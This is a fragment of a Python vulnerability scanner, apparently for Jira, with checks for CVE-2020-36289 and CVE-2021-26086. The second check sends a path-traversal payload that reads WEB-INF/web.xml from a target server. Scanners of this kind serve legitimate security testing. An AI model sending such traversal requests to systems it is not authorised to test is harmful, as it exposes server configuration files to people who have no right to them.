...
def CVE_2020_36289(base_url):
    ...
    #print("\n")
    if r.status_code ==200:
        if ("Assignee" in str(r.content) or "assignee" in str(r.content)):
...
def CVE_2021_26086(base_url):
    r=requests.get(f"{base_url}/s/cfx/_/;/WEB-INF/web.xml")
    #print("\n")
    if r.status_code ==200:
        if ("?xml" in str(r.content)):
            print(f"{RED}[+] {GREEN} [MEDIUM] {RESET}Vulnerable To CVE-2021-26086 : {base_url}/s/cfx/_/;/WEB-INF/web.xml\n")
            response.append(f"[+] [MEDIUM] Vulnerable To CVE-2021-26086 : {base_url}/s/cfx/_/;/WEB-INF/web.xml\n")
        else:
            print(f"{GRAY}[-] Not Vulnerable To CVE-2021-26086\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2021-26086\n")
